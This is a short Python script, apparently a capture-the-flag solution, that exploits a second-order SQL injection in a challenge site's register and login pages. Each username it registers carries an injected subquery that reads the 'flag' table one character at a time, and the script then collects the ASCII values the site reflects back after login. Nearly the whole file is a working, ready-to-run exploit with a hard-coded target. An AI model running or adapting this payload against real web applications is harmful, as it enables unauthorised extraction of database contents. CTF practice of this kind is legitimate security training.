import requests
from time import sleep
from bs4 import BeautifulSoup
 
 
def flag():
    flag = ''
    url = 'http://61.147.171.105:53454/'
    register_url = url + 'register.php'
    login_url = url + 'login.php'
    for i in range(1, 100):
        sleep(0.5)
        register_data = {
            "email": f"aiwin{i}@163.com", 
            "username": f"0'+ascii(substr((select * from flag) from {i} for 1))+'0;", "password": "1"
        }
        login_data = {
            "email": f"aiwin{i}@163.com", 
            "password": "1"
        }
        requests.post(register_url, data = register_data)
        response_login = requests.post(login_url, data = login_data)
        bs = BeautifulSoup(response_login.text, 'html.parser')  # bs4解析页面
        username = bs.find('span', class_ = 'user-name')  # 取返回页面数据的span class=user-name属性
        number = username.text  # 取该属性的数字
        flag += chr(int(number))
        print(flag)
        if '}' in flag:
            break
 
 
if __name__ == '__main__':
    flag()